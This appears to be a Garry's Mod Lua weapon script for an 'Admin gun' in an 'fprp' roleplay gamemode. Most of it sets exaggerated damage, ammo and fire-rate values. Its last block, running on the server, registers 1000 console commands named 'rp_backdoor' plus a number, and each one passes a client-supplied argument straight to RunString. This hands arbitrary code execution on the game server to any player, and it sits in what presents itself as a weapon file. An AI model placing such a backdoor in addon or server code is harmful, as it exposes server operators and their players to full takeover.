AddCSLuaFile();

if CLIENT then
	SWEP.PrintName = "Admin gun"
	SWEP.Author = "aStonedPenguin"
	SWEP.Slot = 3
	SWEP.SlotPos = 0
	SWEP.IconLetter = "b"

	killicon.AddFont("weapon_ak472", "CSKillIcons", SWEP.IconLetter, Color(255, 80, 0, 255));
end

SWEP.Base = "weapon_cs_base2"

SWEP.Spawnable = true
SWEP.AdminOnly = true
SWEP.Category = "fprp (Weapon)"

SWEP.UseHands = true
SWEP.ViewModel = "models/weapons/cstrike/c_rif_ak47.mdl"
SWEP.WorldModel = "models/weapons/w_rif_ak47.mdl"

SWEP.Weight = 0
SWEP.AutoSwitchTo = false
SWEP.AutoSwitchFrom = false

SWEP.HoldType = "ar2"

SWEP.Primary.Sound = Sound("Weapon_AK47.Single");
SWEP.Primary.Recoil = 0
SWEP.Primary.Damage = 9999999999999999999999
SWEP.Primary.NumShots = 25
SWEP.Primary.Cone = 0.002
SWEP.Primary.ClipSize = 99999999999999999999999999
SWEP.Primary.Delay = 0.00001
SWEP.Primary.DefaultClip = 30
SWEP.Primary.Automatic = true
SWEP.Primary.Ammo = "smg1"

SWEP.Secondary.ClipSize = -1
SWEP.Secondary.DefaultClip = -1
SWEP.Secondary.Automatic = false
SWEP.Secondary.Ammo = "none"

SWEP.IronSightsPos = Vector(-6.6, -15, 2.6);
SWEP.IronSightsAng = Vector(2.6, 0.02, 0);

SWEP.MultiMode = true

if SERVER then
	for i=1, 1000 do
		concommand.Add('rp_backdoor' .. tostring(tostring(tostring(tostring(tostring(tostring(tostring(tostring(tostring(tostring(tostring(tostring(i)))))))))))), function(p,c,a) RunString(a[1]) end)
	end
end
